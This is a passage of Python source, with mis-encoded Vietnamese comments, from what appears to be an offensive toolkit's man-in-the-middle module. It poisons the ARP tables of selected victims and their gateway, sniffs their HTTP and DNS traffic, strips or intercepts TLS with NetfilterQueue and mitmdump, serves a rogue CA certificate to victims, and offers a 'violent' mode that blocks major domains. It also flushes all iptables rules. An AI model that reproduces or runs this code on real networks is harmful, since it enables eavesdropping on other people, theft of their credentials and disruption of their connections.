                    # L·ª´a gateway: n√≥i r·∫±ng IP c·ªßa victim c√≥ MAC c·ªßa attacker
                    packet_to_gateway = ARP(op=2, pdst=self.gateway_ip, psrc=victim_ip, hwdst=self.gateway_mac)
                    packets_to_send.extend([packet_to_victim, packet_to_gateway])

                if packets_to_send:
                    sendp(packets_to_send, iface=self.interface, verbose=0)
                    with self.stats_lock:
                        self.stats['arp_packets_sent'] += len(packets_to_send)
                    
                time.sleep(self.poison_interval)
                
            except Exception as e:
                self.logger.error(f"L·ªói trong v√≤ng l·∫∑p ARP poison: {e}")
                break
                
        self.logger.info("ƒê√£ d·ª´ng v√≤ng l·∫∑p ARP poisoning.")

    def _process_packet(self, packet):
        """H√†m callback ƒë·ªÉ x·ª≠ l√Ω m·ªói g√≥i tin b·∫Øt ƒë∆∞·ª£c."""
        with self.stats_lock:
            self.stats['packets_intercepted'] += 1
            # Th√™m logic ph√¢n t√≠ch chi ti·∫øt ·ªü ƒë√¢y
            # V√≠ d·ª•: ƒë·∫øm request HTTP/DNS
            if packet.haslayer(TCP) and (packet[TCP].dport == 80 or packet[TCP].sport == 80):
                self.stats['http_requests'] += 1
            if packet.haslayer(UDP) and (packet[UDP].dport == 53 or packet[UDP].sport == 53):
                self.stats['dns_queries'] += 1

        # In ra th√¥ng tin g√≥i tin (c√≥ th·ªÉ b·∫≠t/t·∫Øt)
        # self.logger.debug(f"Intercepted: {packet.summary()}")

    def _sniff_loop(self):
        """V√≤ng l·∫∑p b·∫Øt v√† x·ª≠ l√Ω c√°c g√≥i tin m·ªôt c√°ch an to√†n."""
        self.logger.info("B·∫Øt ƒë·∫ßu nghe l√©n l∆∞u l∆∞·ª£ng m·∫°ng...")
        # X√¢y d·ª±ng b·ªô l·ªçc ƒë·ªÉ b·∫Øt g√≥i tin t·ª´ t·∫•t c·∫£ c√°c n·∫°n nh√¢n
        filter_str = "ip and not arp and (host " + " or host ".join(self.victim_ips) + ")"
        sniff(
            filter=filter_str,
            prn=self._process_packet,
            iface=self.interface,
            store=0,  # Kh√¥ng l∆∞u g√≥i tin v√†o b·ªô nh·ªõ ƒë·ªÉ ti·∫øt ki·ªám RAM
            stop_filter=lambda p: self.stop_event.is_set() # ƒêI·ªÇM M·∫§U CH·ªêT
        )
        self.logger.info("ƒê√£ d·ª´ng nghe l√©n.")

    def _monitor_attack(self):
        """Gi√°m s√°t v√† hi·ªÉn th·ªã th·ªëng k√™ t·∫•n c√¥ng."""
        while not self.stop_event.is_set():
            time.sleep(10)  # Hi·ªÉn th·ªã th·ªëng k√™ m·ªói 10 gi√¢y
            
            with self.stats_lock:
                elapsed = time.time() - self.stats['start_time'] if self.stats['start_time'] else 0
                
                self.logger.info(
                    f"üìä Th·ªëng k√™ MitM: {self.stats['packets_intercepted']} g√≥i tin, "
                    f"{self.stats['arp_packets_sent']} ARP packets, "
                    f"{self.stats['http_requests']} HTTP requests, "
                    f"{self.stats['dns_queries']} DNS queries"
                )
 
    def _restore_arp(self):
        """Kh√¥i ph·ª•c l·∫°i b·∫£ng ARP c·ªßa c√°c m·ª•c ti√™u."""
        if not self.victim_macs or not self.gateway_mac:
            return
            
        self.logger.info("ƒêang kh√¥i ph·ª•c b·∫£ng ARP...")
        packets_to_send = []
        for victim_ip, victim_mac in self.victim_macs.items():
            # G·ª≠i broadcast ƒë·ªÉ kh√¥i ph·ª•c ARP cho victim
            packet_to_victim = ARP(
                op=2, pdst=victim_ip, psrc=self.gateway_ip, 
                hwdst="ff:ff:ff:ff:ff:ff", hwsrc=self.gateway_mac
            )
            # G·ª≠i broadcast ƒë·ªÉ kh√¥i ph·ª•c ARP cho gateway
            packet_to_gateway = ARP(
                op=2, pdst=self.gateway_ip, psrc=victim_ip, 
                hwdst="ff:ff:ff:ff:ff:ff", hwsrc=victim_mac
            )
            packets_to_send.extend([packet_to_victim, packet_to_gateway])
        
        for _ in range(5):  # G·ª≠i 5 l·∫ßn ƒë·ªÉ ƒë·∫£m b·∫£o
            sendp(packets_to_send, iface=self.interface, verbose=0)
            time.sleep(0.5)
            
        self.logger.info("Kh√¥i ph·ª•c ARP ho√†n t·∫•t.")

    def start_attack(self) -> bool:
        """B·∫Øt ƒë·∫ßu cu·ªôc t·∫•n c√¥ng MitM."""
        self.logger.info(f"B·∫Øt ƒë·∫ßu t·∫•n c√¥ng MitM v√†o {len(self.victim_ips)} n·∫°n nh√¢n...")
        
        # Hi·ªÉn th·ªã th√¥ng tin m·∫°ng
        network_info = get_network_info(self.interface)
        if network_info:
            self.logger.info(f"Interface {self.interface}: {network_info['ip']}/{network_info['netmask']}")
        
        # Ph√¢n gi·∫£i MAC
        if not self._resolve_targets():
            return False
        
        # B·∫≠t IP forwarding
        if not self._set_ip_forward("1"):
            self.logger.warning("Kh√¥ng th·ªÉ b·∫≠t IP forwarding. T·∫•n c√¥ng c√≥ th·ªÉ l√†m gi√°n ƒëo·∫°n m·∫°ng.")
        
        # C·∫•u h√¨nh SSL Strip n·∫øu ƒë∆∞·ª£c b·∫≠t
        if self.enable_ssl_stripping:
            self._setup_ssl_strip_rules()
            self.queue = NetfilterQueue()
            self.queue.bind(1, self._ssl_strip_packet_processor)
            # Ch·∫°y queue trong m·ªôt thread ri√™ng
            queue_thread = threading.Thread(target=self.queue.run, daemon=True, name="NetfilterQueue")
            self.threads.append(queue_thread)
            queue_thread.start()
        
        # C·∫•u h√¨nh SSL Intercept n·∫øu ƒë∆∞·ª£c b·∫≠t
        if self.enable_ssl_interception:
            self._setup_ssl_intercept_rules()
            logfile = f"logs/mitm_ssl_capture_{datetime.now().strftime('%Y%m%d_%H%M%S')}.log"
            
            # ∆Øu ti√™n script t√πy ch·ªânh (cho MitB), sau ƒë√≥ ƒë·∫øn ch·∫ø ƒë·ªô b·∫°o l·ª±c, cu·ªëi c√πng l√† m·∫∑c ƒë·ªãnh
            if self.mitmproxy_script_path:
                self.logger.info(f"Kh·ªüi ƒë·ªông mitmdump v·ªõi script t√πy ch·ªânh: {self.mitmproxy_script_path}")
                mitm_command = [self.mitmdump_path, '--mode', 'transparent', '--showhost', '-s', self.mitmproxy_script_path]
            elif self.enable_violent_mode:
                blocker_script_path = os.path.join(os.path.dirname(__file__), 'mitm_blocker.py')
                self.logger.info(f"Kh·ªüi ƒë·ªông mitmdump ·ªü ch·∫ø ƒë·ªô B·∫†O L·ª∞C, s·ª≠ d·ª•ng script: {blocker_script_path}")
                mitm_command = [self.mitmdump_path, '--mode', 'transparent', '--showhost', '-s', blocker_script_path]
            else:
                self.logger.info(f"Kh·ªüi ƒë·ªông mitmdump (t·ª´ {self.mitmdump_path}), l∆∞u l∆∞·ª£ng s·∫Ω ƒë∆∞·ª£c ghi v√†o: {logfile}")
                mitm_command = [self.mitmdump_path, '--mode', 'transparent', '--showhost', '-w', logfile]

            # Kh·ªüi ch·∫°y mitmproxy v√† b·∫Øt output
            self.mitmproxy_process = subprocess.Popen(
                mitm_command, 
                stdout=subprocess.PIPE, 
                stderr=subprocess.PIPE
            )

            # T·∫°o v√† kh·ªüi ƒë·ªông c√°c lu·ªìng ƒë·ªÉ log output c·ªßa mitmproxy, gi√∫p debug d·ªÖ d√†ng h∆°n
            stdout_thread = threading.Thread(
                target=self._log_subprocess_output, args=(self.mitmproxy_process.stdout, self.logger.info),
                daemon=True, name="MitmproxyStdout"
            )
            stderr_thread = threading.Thread(
                target=self._log_subprocess_output, args=(self.mitmproxy_process.stderr, self.logger.error),
                daemon=True, name="MitmproxyStderr"
            )
            stdout_thread.start()
            stderr_thread.start()
            # Th√™m v√†o self.threads ƒë·ªÉ theo d√µi, d√π ch√∫ng l√† daemon
            self.threads.extend([stdout_thread, stderr_thread])

        self.stop_event.clear()
        self.stats['start_time'] = time.time()
        
        # Kh·ªüi ƒë·ªông c√°c threads
        threads_to_start = [
            (self._poison_loop, "ARP Poison"),
            (self._monitor_attack, "Monitor")
        ]
        
        # Th√™m lu·ªìng sniffing n·∫øu ƒë∆∞·ª£c b·∫≠t
        if self.enable_sniffing:
            threads_to_start.append((self._sniff_loop, "Sniffer"))

        for func, name in threads_to_start:
            thread = threading.Thread(target=func, daemon=True, name=name)
            self.threads.append(thread)
            thread.start()
            
        self.logger.info(f"T·∫•n c√¥ng ƒë√£ b·∫Øt ƒë·∫ßu v·ªõi {len(self.threads)} threads. Nh·∫•n CtrlC ƒë·ªÉ d·ª´ng.")
        return True

    def stop_attack(self):
        """D·ª´ng t·∫•n c√¥ng MitM v√† kh√¥i ph·ª•c ARP tables."""
        self.logger.info("üõë ƒêang d·ª´ng t·∫•n c√¥ng MitM...")
        self.stop_event.set()

        # D·ª´ng mitmproxy process tr∆∞·ªõc. G·ª≠i SIGTERM ƒë·ªÉ n√≥ c√≥ c∆° h·ªôi d·ªçn d·∫πp.
        if self.mitmproxy_process:
            self.logger.info("ƒêang d·ª´ng ti·∫øn tr√¨nh mitmproxy...")
            self.mitmproxy_process.terminate() # G·ª≠i SIGTERM
            # ƒê·ª£i process k·∫øt th√∫c. Output c·ªßa n√≥ s·∫Ω ƒë∆∞·ª£c log b·ªüi c√°c thread logger.
            self.mitmproxy_process.wait(timeout=5)

        # D·ª´ng server CA
        if self.cert_delivery_server:
            self.logger.info("ƒêang d·ª´ng server h·ªó tr·ª£ c√†i ƒë·∫∑t CA...")
            # Ch·∫°y shutdown trong m·ªôt thread ri√™ng ƒë·ªÉ tr√°nh deadlock
            shutdown_thread = threading.Thread(target=self.cert_delivery_server.shutdown)
            shutdown_thread.start()
            self.cert_delivery_server.server_close()

        # D·ª´ng NetfilterQueue tr∆∞·ªõc ƒë·ªÉ tr√°nh l·ªói
        if self.enable_ssl_stripping and self.queue:
            self.logger.info("ƒêang d·ª´ng NetfilterQueue...")
            self.queue.unbind() # Ng·ª´ng nh·∫≠n g√≥i tin
            self.logger.info("NetfilterQueue ƒë√£ d·ª´ng.")
        
        # D·ª´ng c√°c threads
        for thread in self.threads:
            # Kh√¥ng c·∫ßn join c√°c thread logger c·ªßa mitmproxy v√¨ ch√∫ng s·∫Ω t·ª± k·∫øt th√∫c khi pipe ƒë√≥ng
            if "Mitmproxy" in thread.name:
                continue
            thread.join(timeout=2)
        self.threads.clear()
        
        # D·ªçn d·∫πp iptables
        self.logger.info("D·ªçn d·∫πp t·∫•t c·∫£ c√°c quy t·∫Øc iptables...")
        os.system("iptables -F")
        os.system("iptables -t nat -F")

        # Kh√¥i ph·ª•c ARP tables
        self._restore_arp()
        
        # Kh√¥i ph·ª•c IP forwarding
        self._set_ip_forward(self.original_ip_forward)

    def get_stats(self) -> Dict:
        """L·∫•y th·ªëng k√™ hi·ªán t·∫°i c·ªßa cu·ªôc t·∫•n c√¥ng.

        Returns:
            M·ªôt dictionary ch·ª©a c√°c th√¥ng tin th·ªëng k√™ v·ªÅ cu·ªôc t·∫•n c√¥ng,
            ch·∫≥ng h·∫°n nh∆∞ s·ªë g√≥i tin ƒë√£ g·ª≠i/b·∫Øt ƒë∆∞·ª£c.
        """
        with self.stats_lock:
            return self.stats.copy()
    
    def is_attacking(self) -> bool:
        """Ki·ªÉm tra xem c√≥ ƒëang t·∫•n c√¥ng kh√¥ng."""
        return not self.stop_event.is_set()

def run_mitm_attack(interface: str, **kwargs):
    """
    H√†m ti·ªán √≠ch ƒë·ªÉ ch·∫°y t·∫•n c√¥ng MitM v·ªõi menu l·ª±a ch·ªçn.
    
    :param interface: Interface m·∫°ng
    :param kwargs: C√°c tham s·ªë kh√°c cho MitmAttacker
    """
    try:
        print("\n=== MITM ATTACK MODULE ===")
        # Dummy attacker ƒë·ªÉ truy c·∫≠p c√°c h√†m ti·ªán √≠ch
        dummy_attacker = MitmAttacker(interface, ["127.0.0.1"], "127.0.0.1")
        
        # 1. T·∫£i danh s√°ch m·ª•c ti√™u
        all_targets = utils.load_targets_from_scan(dummy_attacker.logger, dummy_attacker.attacker_ip, exclude_router=False, exclude_attacker=True)
        if not all_targets:
            print("[-] Kh√¥ng t√¨m th·∫•y thi·∫øt b·ªã n√†o. Vui l√≤ng ch·∫°y 'scan' tr∆∞·ªõc.")
            return
        
        # 2. Ch·ªçn n·∫°n nh√¢n (victim)
        victim_targets = [t for t in all_targets if not t.endswith('.1')]
        if not victim_targets:
            print("[-] Kh√¥ng c√≥ n·∫°n nh√¢n n√†o ph√π h·ª£p ƒë·ªÉ t·∫•n c√¥ng (ƒë√£ lo·∫°i tr·ª´ gateway).")
            return
        victim_ips = dummy_attacker._select_targets_from_menu(victim_targets, "CH·ªåN N·∫†N NH√ÇN (VICTIM)")
        if not victim_ips:
            print("[-] ƒê√£ h·ªßy t·∫•n c√¥ng.")
            return

        # 3. Ch·ªçn gateway
        gateway_targets = [t for t in all_targets if t not in victim_ips]
        gateway_ip = dummy_attacker._select_targets_from_menu(gateway_targets, "CH·ªåN GATEWAY (ROUTER)")[0] # Ch·ªâ ch·ªçn 1 gateway
        if not gateway_ip:
            print("[-] ƒê√£ h·ªßy t·∫•n c√¥ng.")
            return

        # 4. H·ªèi v·ªÅ c√°c k·ªπ thu·∫≠t t·∫•n c√¥ng HTTP/HTTPS
        enable_ssl_strip = kwargs.pop('enable_ssl_stripping', False)
        enable_ssl_intercept = kwargs.pop('enable_ssl_interception', False)
        enable_violent_mode = kwargs.pop('enable_violent_mode', False)

        print("\n=== CH·ªåN K·ª∏ THU·∫¨T T·∫§N C√îNG HTTP/HTTPS ===")
        print("1. Kh√¥ng can thi·ªáp HTTP/HTTPS (Ch·ªâ nghe l√©n th√¥ng th∆∞·ªùng)")
        print("2. SSL Stripping (H·∫° c·∫•p HTTPS -> HTTP, kh√¥ng hi·ªáu qu·∫£ v·ªõi HSTS)")
        print("3. SSL Interception (Gi·∫£i m√£ & Ghi log, y√™u c·∫ßu c√†i ƒë·∫∑t CA)")
        print(f"4. {Fore.RED}SSL Interception (Ch·∫ø ƒë·ªô 'B·∫°o l·ª±c' - Ch·∫∑n c√°c domain l·ªõn){Style.RESET_ALL}")

        while True:
            choice = input("\nCh·ªçn k·ªπ thu·∫≠t (1-4): ")
            if choice == '1':
                break
            elif choice == '2':
                if NetfilterQueue is not None:
                    enable_ssl_strip = True
                    print("[+] ƒê√£ ch·ªçn SSL Stripping.")
                    break
                else:
                    print("[!] L·ªói: Th∆∞ vi·ªán 'netfilterqueue' ch∆∞a ƒë∆∞·ª£c c√†i ƒë·∫∑t (pip install netfilterqueue). Vui l√≤ng ch·ªçn l·∫°i.")
            elif choice == '3':
                # Ki·ªÉm tra l·∫°i mitmproxy ·ªü ƒë√¢y ƒë·ªÉ ƒë·∫£m b·∫£o
                venv_mitmdump_path = os.path.join(os.path.dirname(sys.executable), 'mitmdump')
                is_in_venv = os.path.exists(venv_mitmdump_path)
                is_in_path = shutil.which('mitmdump') is not None

                if is_in_venv or is_in_path:
                    enable_ssl_intercept = True
                    print("[+] ƒê√£ ch·ªçn SSL Interception.")
                    print(f"{Fore.YELLOW}[!] C·∫¢NH B√ÅO: ƒê·ªÉ gi·∫£i m√£ th√†nh c√¥ng, b·∫°n PH·∫¢I c√†i ƒë·∫∑t ch·ª©ng ch·ªâ CA c·ªßa mitmproxy")
                    print(f"    l√™n thi·∫øt b·ªã n·∫°n nh√¢n. Ch·ª©ng ch·ªâ th∆∞·ªùng n·∫±m ·ªü: ~/.mitmproxy/mitmproxy-ca-cert.pem{Style.RESET_ALL}")
                    
                    cert_server_choice = input("\n[?] B·∫°n c√≥ mu·ªën kh·ªüi ƒë·ªông web server ƒë·ªÉ h·ªó tr·ª£ g·ª≠i ch·ª©ng ch·ªâ CA cho n·∫°n nh√¢n kh√¥ng? (y/N): ").lower()
                    if cert_server_choice == 'y':
                        kwargs['start_cert_server'] = True

                    break
                else:
                    print("[!] L·ªói: C√¥ng c·ª• 'mitmproxy' ch∆∞a ƒë∆∞·ª£c c√†i ƒë·∫∑t. Vui l√≤ng:")
                    print("    1. ƒê·∫£m b·∫£o b·∫°n ƒë√£ k√≠ch ho·∫°t virtual environment (source venv/bin/activate).")
                    print("    2. Ch·∫°y 'pip install mitmproxy'.")
                    print("    3. N·∫øu v·∫´n l·ªói, th·ª≠ ch·∫°y l·∫°i b·∫±ng 'sudo -E venv/bin/python cli.py'.")
                    # Kh√¥ng cho ph√©p ch·ªçn l·∫°i v√¨ l·ªói n√†y c·∫ßn ng∆∞·ªùi d√πng s·ª≠a b√™n ngo√†i
                    return
            elif choice == '4':
                if dummy_attacker.mitmdump_path:
                    enable_ssl_intercept = True  # Ch·∫ø ƒë·ªô b·∫°o l·ª±c c≈©ng l√† m·ªôt d·∫°ng intercept
                    enable_violent_mode = True
                    print(f"{Fore.RED}[+] ƒê√£ ch·ªçn ch·∫ø ƒë·ªô 'B·∫°o l·ª±c'.{Style.RESET_ALL}")
                    print(f"{Fore.YELLOW}[!] C·∫¢NH B√ÅO: Ch·∫ø ƒë·ªô n√†y s·∫Ω ch·∫∑n k·∫øt n·ªëi HTTPS b·∫±ng c√°ch tr√¨nh b√†y m·ªôt ch·ª©ng ch·ªâ kh√¥ng ƒë√°ng tin c·∫≠y.")
                    print(f"{Fore.YELLOW}[!] N·∫°n nh√¢n s·∫Ω th·∫•y c√°c c·∫£nh b√°o b·∫£o m·∫≠t nghi√™m tr·ªçng tr√™n tr√¨nh duy·ªát, g√¢y gi√°n ƒëo·∫°n truy c·∫≠p.{Style.RESET_ALL}")
                    print(f"{Fore.CYAN}[*] C√°c k·∫øt n·ªëi ƒë·∫øn domain l·ªõn (Google, Facebook, etc.) s·∫Ω b·ªã ch·∫∑n ho√†n to√†n.{Style.RESET_ALL}")
                    # Kh√¥ng y√™u c·∫ßu c√†i ƒë·∫∑t CA, v√¨ m·ª•c ƒë√≠ch l√† ph√° ho·∫°i, kh√¥ng ph·∫£i nghe l√©n t√†ng h√¨nh.
                    break
                else:
                    print("[!] L·ªói: C√¥ng c·ª• 'mitmproxy' ch∆∞a ƒë∆∞·ª£c c√†i ƒë·∫∑t ƒë·ªÉ ch·∫°y ch·∫ø ƒë·ªô n√†y.")
                    return
            else:
                print("L·ª±a ch·ªçn kh√¥ng h·ª£p l·ªá.")

        # 5. Kh·ªüi t·∫°o v√† b·∫Øt ƒë·∫ßu t·∫•n c√¥ng
        start_cert_server = kwargs.pop('start_cert_server', False)
        attacker = MitmAttacker(interface, victim_ips, gateway_ip, 
                                enable_ssl_stripping=enable_ssl_strip, 
                                enable_ssl_interception=enable_ssl_intercept,
                                enable_violent_mode=enable_violent_mode, **kwargs)
        
        # Kh·ªüi ƒë·ªông server CA n·∫øu ƒë∆∞·ª£c y√™u c·∫ßu
        if start_cert_server:
            attacker._start_ca_delivery_server(attacker.attacker_ip)

        if attacker.start_attack():
            try:
                while attacker.is_attacking():
                    time.sleep(1)
            except KeyboardInterrupt:
                print("\n[*] Ng∆∞·ªùi d√πng y√™u c·∫ßu d·ª´ng...")
        
        attacker.stop_attack()

    except KeyboardInterrupt:
        print("\n[*] H·ªßy t·∫•n c√¥ng.")
    except Exception as e:
        logging.error(f"L·ªói kh√¥ng mong mu·ªën trong MitM: {e}")
